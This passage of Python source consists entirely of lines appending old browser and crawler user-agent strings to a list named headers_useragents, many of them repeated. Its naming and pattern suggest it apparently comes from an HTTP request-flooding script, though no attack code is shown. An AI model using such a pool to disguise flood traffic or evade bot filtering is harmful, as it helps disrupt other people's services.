                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
